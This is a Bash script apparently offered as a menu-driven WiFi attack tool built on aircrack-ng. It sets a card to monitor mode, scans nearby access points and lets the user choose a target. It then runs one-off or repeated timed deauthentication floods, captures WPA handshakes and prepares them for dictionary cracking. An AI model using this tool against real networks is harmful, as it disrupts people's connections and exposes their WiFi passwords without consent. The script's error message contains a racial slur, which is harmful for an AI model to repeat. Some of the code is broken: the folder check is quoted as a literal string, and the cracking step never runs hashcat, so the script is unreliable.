#!/bin/bash

function create_folders(){
	if [ $dircreated == 0 ]; then
		mkdir /opt/n00b
		mkdir /opt/n00b/Dictionaries
		mkdir /opt/n00b/Handshakes
		mkdir /opt/n00b/Handshakes/Clean
		mkdir /opt/n00b/Handshakes/HCCap
		mkdir /opt/n00b/temporal
		mv n00b.sh /opt/n00b/
		cd /opt/n00b/
		menu
	elif [ $dircreated == 1 ]; then
		echo -e "\nThe directory is already created" && sleep 1
		echo -e "\nRe-create?"
		printf "Y/N · "
		read recreatedir
		if [ "$recreatedir" == "Y" ]; then
			rm -rf /opt/n00b
			dircreated=0
			create_folders
		elif [ "$recreatedir" == "N" ]; then
			echo -e "\nReturning to the menu" && sleep 1.5
			clear
			menu
		else
			echo -e "\nInvalid option, please use caps" && sleep 1.5
			clear
			create_folders
		fi
	fi
}

function check_aircrack(){
	resize -s 7 34
	clear
	echo
	echo
	echo -ne "   Aircrack-ng ----- " && sleep 0.5
		if ! hash aircrack-ng 2>/dev/null; then
			echo -e "\e[1;31mNot installed" && sleep 1
			printf "Bye " && sleep 1
			echo "Bye..." && sleep 0.5
			exit
		else
			echo -e "\e[1;32mOK!"
			echo && sleep 1
			printf "   Press enter to continue...\e[0m"
			read CYKA
			aircrack_check=1
			echo
		fi
}

function interface_prepare(){

	resize -s 6 35

	MONAME="$(iwconfig 2>&1 | grep Monitor | awk '{print $1}')"
	NONAME="$(airmon-ng | grep wlan* | awk '{print $2}')"

	if [ "$MONAME" == "" ]; then
		airmon-ng check kill
		airmon-ng start $NONAME
		NEWMONAME="$(iwconfig 2>&1 | grep Monitor | awk '{print $1}')"
		clear
		echo
		echo "   Using interface $NEWMONAME -hic-" && sleep 1
		echo
		printf "   Enter to continue..."
		read CYKA
		monitormode=1
		managedmode=0
	else
		airmon-ng stop $MONAME
		clear
		echo
		echo "   Restarting function -hic-" && sleep 2
		interface_prepare
	fi
}

function airodump(){

	clear
	resize -s 6 25
	clear
	echo "Starting the scan" && sleep 0.5
	echo "PRESS CTLR+C TO STOP" && sleep 0.5
	echo
	printf "Enter to continue..."
	read CYKA
	echo
	resize -s 55 95
	clear
	if [ "$temporalcheck" == "" ]; then
		mkdir temporal
	fi
	rm $temporal/*
	airodump-ng -w $temporal/list -a $NEWMONAME
	selection
	sleep 1
	resize -s 15 95
	clear
	echo
	echo
	echo "     Capturing packets from $ssid [$mac] on channel $channel" && sleep 1.5
	clear
	export mac=$mac
	export NEWMONAME=$NEWMONAME
	export -f attackMenu
	xterm -hold -e attackMenu & airodump-ng --bssid $mac --channel $channel --write $ssid $NEWMONAME
	clearthecrap
	airmondone=1
}

function clearthecrap(){
	rm $ssid*.csv
	rm $ssid*.kismet*
	rm $temporal/*
	if [ "$handshakescheck" == "" ]; then
		mkdir Handshakes
	fi
	mv *.cap ./Handshakes/
}

function attackMenu(){
	while true; do
		clear
		echo
		echo "   Select attack:"
		echo
		echo "     1) Deauthentification"
		echo "     2) Automatic deauth"
		echo
		printf "   Selection · "
		read selnum

		if [ $selnum == 1 ]; then
			clear
			aireplay-ng --deauth 10 -a $mac $NEWMONAME
			echo
			echo "Attack done, returning to menu" && sleep 2
		elif [ $selnum == 2 ]; then
			clear
			echo
			printf "  Input round times · "
			read roundtimes
			echo
			printf "  Input time between round in seconds · "
			read timesround
			echo
			printf "  Enter to continue..."
			read CYKA
			roundbase=0
			while [ $roundbase -lt $roundtimes ]; do
				roundbase=$((roundbase+1))
				clear
				echo
				echo "                   · Starting round $roundbase ·"
				echo
				aireplay-ng --deauth 10 -a $mac $NEWMONAME
				echo
				echo "       · Done, waiting $timesround seconds until next round ·"
				sleep $timesround
			done
		else
			echo "Not a valid option"
			echo
			printf "Press enter to continue..."
			read CYKA
		fi
	done
}

function autoShutdown(){
	clear
	echo
	echo "Input seconds to wait"
	echo
	printf " · "
	read sec
	echo
	echo "Starting" && sleep 0.3
	echo
	echo "Started, waiting $sec seconds to shut down" && sleep 1
	while [ $sec -gt 0 ]; do
		clear
		echo "SHUTDOWN IN $sec SECONDS"
		sec=$((sec-1))
		if [ $sec -lt 10 ]; then
			echo
			echo "INMINENT SHUTDOWN"
		fi
		sleep 1
	done
	shutdown now
}

function selection(){
	
	clear
	
	LINEAS_WIFIS_CSV=`wc -l $temporal/$CSVDB | awk '{print $1}'`
	
	linap=`cat $temporal/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
	linap=`expr $linap - 1`
	head -n $linap $temporal/$CSVDB &> $temporal/clients-02.csv 
	tail -n +$linap $temporal/$CSVDB &> $temporal/clients.csv 
	echo "                         List of APs Objective   "
	echo ""
	echo " #      MAC                      CH      SEC      PWR    ESSID"
	echo ""
	i=0
	
	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
		longueur=${#MAC}
		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		PRIVACY=${PRIVACY:0:4}
		if [ $longueur -ge 17 ]; then
			i=$(($i+1))
			POWER=`expr $POWER + 100`
			CLIENT=`cat $temporal/clients.csv | grep $MAC`
			
			if [ "$CLIENT" != "" ]; then
				CLIENT="*" 
			fi
			
			echo -e " ""$verde"$i")"$blanco"$CLIENT\t""$amarillo"$MAC"\t""$verde"$CHANNEL"\t""$rojo" $PRIVACY"\t  ""$amarillo"$POWER%"\t""$verde"$ESSID""$rescolor""
			aidlenght=$IDLENGTH
			assid[$i]=$ESSID
			achannel[$i]=$CHANNEL
			amac[$i]=$MAC
			aprivacy[$i]=$PRIVACY
			aspeed[$i]=$SPEED
		fi
	done < $temporal/clients-02.csv
	echo
	echo -e ""$verde"("$blanco"*"$verde") Network with clients"$rescolor""
	echo ""
	echo -n "      Selection · "
	read choice
	idlenght=${aidlenght[$choice]}
	ssid=${assid[$choice]}
	channel=$(echo ${achannel[$choice]}|tr -d [:space:])
	mac=${amac[$choice]}
	privacy=${aprivacy[$choice]}
	speed=${aspeed[$choice]}
	Host_IDL=$idlength
	Host_SPEED=$speed
	Host_ENC=$privacy
	Host_MAC=$mac
	Host_CHAN=$channel
	acouper=${#ssid}
	fin=$(($acouper-idlength))
	Host_SSID=${ssid:1:fin}
}

function managed(){
	resize -s 6 35
	MONAME="$(iwconfig 2>&1 | grep Monitor | awk '{print $1}')"
	NONAME="$(airmon-ng | grep wlan* | awk '{print $2}')"
	if [ $MONAME == "" ]; then
		clear
		echo "$NONAME is already on managed mode" && sleep 1.5
		echo
		printf "Enter to continue..."; read CYKA
	else
		echo "Stoping $MONAME and restarting NetworkManager"
		echo
		airmon-ng stop $MONAME && NetworkManager
		NEWMANAME="$(airmon-ng | grep wlan* | awk '{print $2}')"
		echo
		echo "The new name of the interface is:"
		echo "$NEWMANAME"
		echo
		printf "Enter to continue..."; read CYKA
		clear
		managedmode=1
		monitormode=0
	fi
}

function cHashcat(){

	unset caplist i
	while IFS= read -r -d $'\0' f; do
 		caplist[i++]="$f"
	done < <(find ./Handshakes/ -maxdepth 1 -type f -name "*.cap" -print0 )

	unset diclist i
	while IFS= read -r -d $'\0' f; do
 		diclist[i++]="$f"
	done < <(find ./Dictionaries/ -maxdepth 1 -type f -name "*" -print0 )

	resize -s 10 74
	PS3="Selection · "
	clear
	echo "Select a .cap file, 0 to return"
	echo
	select capname in "${caplist[@]}"
	do
		if [[ "$REPLY" == 0 ]]; then
			menu
		fi

		if [[ "$capname" == "" ]]; then
			echo "Not a valid option"
			continue
		fi
		echo
		echo "$capname" && sleep 1.5
		break
	done
	clear
	echo "Select a dictionary, 0 to return"
	echo
	select dicname in "${diclist[@]}"
	do
		if [[ "$REPLY" == 0 ]]; then
			menu
		fi

		if [[ "$dicname" == "" ]]; then
			echo "Not a valid option"
			continue
		fi
		echo
		echo "$dicname" && sleep 1.5
		break
	done
	clear
	newcapname="$(ls $capname | awk -F'[/-.]' '{print $4}')"
	echo "Enter to clear $capname.cap and create $newcapname.hccap" && read CYKA
	wpaclean ./Handshakes/Clean/$newcapname $capname
	aircrack-ng ./Handshakes/Clean/$newcapname -J ./Handshakes/HCCap/$newcapname
	resize -s 6 78
	clear
	echo
	echo "Cracking $newcapname with $dicname"
	echo
	printf "Enter to continue... "; read CYKA

	chashcatdone=1
}


function menu(){

	while true; do
		resize -s 22 42
		clear
		echo -e "\e[1m\e[36m|\    | ___  ___  __" && sleep 0.2
		echo -e "| \   ||   ||   ||  )" && sleep 0.2
		echo -e "|  \  ||   ||   ||-<" && sleep 0.2
		echo -e "|   \ ||   ||   ||  \ " && sleep 0.2
		echo -e "|    \||___||___||___)\e[21m Script.sh" && sleep 0.2
		echo -e "Made by Capuno under GPL v3 license\e[0m" && sleep 0.2
		echo
		echo -e "      \e[1m\e[91mRED: Not done\e[0m\e[21m    \e[1m\e[92mGREEN: Done\e[0m\e[21m" && sleep 0.2
		echo
		echo -e " \e[36mSelect an option:\e[0m" && sleep 0.2
		echo
		if [ $aircrack_check == 1 ]; then
			echo -e "  \e[92m1) Check aircrack-ng dependencies\e[0m" && sleep 0.2
		else
			echo -e "  \e[91m1) Check aircrack-ng dependencies\e[0m" && sleep 0.2
		fi
		if [ $monitormode == 1 ]; then
			echo -e "  \e[92m2) Prepare interface on monitor mode\e[0m" && sleep 0.2
		else
			echo -e "  \e[91m2) Prepare interface on monitor mode\e[0m" && sleep 0.2
		fi
		if [ $managedmode == 1 ]; then
			echo -e "  \e[92m3) Prepare interface on managed mode\e[0m" && sleep 0.2
		else
			echo -e "  \e[91m3) Prepare interface on managed mode\e[0m" && sleep 0.2
		fi
		if [ $monitormode == 1 ]; then
			if [ $airmondone == 1 ]; then
				echo -e "  \e[92m4) Run airodump-ng\e[0m" && sleep 0.2
			else
				echo -e "  \e[91m4) Run airodump-ng\e[0m" && sleep 0.2
			fi
		else
			echo -e "  \e[91m4) Run airodump-ng (Run first option 2)\e[0m" && sleep 0.2
		fi
		if [ $chashcatdone == 1 ]; then
			echo -e "  \e[92m5) Run cudaHashcat\e[0m"
		else
			echo -e "  \e[91m5) Run cudaHashcat\e[0m"
		fi
		if [ $dircreated == 1 ]; then
			echo -e "  \e[92m6) Create necessary folders\e[0m"
		else
			echo -e "  \e[91m6) Create necessary folders\e[0m"

		echo -e "\e[94m------------------------------------------\e[0m" && sleep 0.2
		echo -e "  \e[94m9) Run AutoShutdown function (Optional)\e[0m" && sleep 0.2
		echo -e "  \e[94m0)     Exit\e[0m" && sleep 0.2
		echo
		fi
		printf "\n Selection · "
		read SELEC

		if [ $SELEC == 1 ]; then
			clear
			check_aircrack
		elif [ $SELEC == 2 ]; then
			clear
			interface_prepare
		elif [ $SELEC == 3 ]; then
			clear
			managed
		elif [ $SELEC == 4 ]; then
			if [ $monitormode == 1 ]; then
				clear
				airodump
			else
				clear
				echo
				echo "You need to first set the interface" && sleep 0.5
				echo "Run option 2 on menu" && sleep 0.5
				echo
				printf "Enter to continue..."
				read CYKA
			fi
		elif [ $SELEC == 5 ]; then
			clear
			cHashcat
		elif [ $SELEC == 6 ]; then
			clear
			create_folders
		elif [ $SELEC == 9 ]; then
			clear
			export -f autoShutdown
			xterm -hold -e autoShutdown & menu
		elif [ $SELEC == 0 ]; then
			if [ $MONAME == "" ]; then
				clear
				printf "Bye " && sleep 0.5
				echo "Bye..."
				exit
			else
				airmon-ng stop $MONAME && NetworkManager
				clear
				printf "Bye " && sleep 0.5
				echo "Bye..."
				exit
			fi
		else
			clear
			echo "WTF NIGGER THATS NOT AN OPTION"
		fi
	done
}

blanco="\033[1;37m"
gris="\033[0;37m"
magenta="\033[0;35m"
rojo="\033[1;31m"
verde="\033[1;32m"
amarillo="\033[1;33m"
azul="\033[1;34m"
rescolor="\e[0m"

chashcatdone=0
managedmode=0
MONAME="$(iwconfig 2>&1 | grep Monitor | awk '{print $1}')"
handshakescheck="$(ls | grep Handshakes)"
temporalcheck="$(ls | grep temporal)"
airmondone=0
monitormode=0
aircrack_check=0
CSVDB=list-01.csv
temporal="./temporal"
checkdir='$(ls /opt | grep n00b)'

if [ $checkdir == "" ]; then
	dircreated=0
else
	dircreated=1
fi

menu
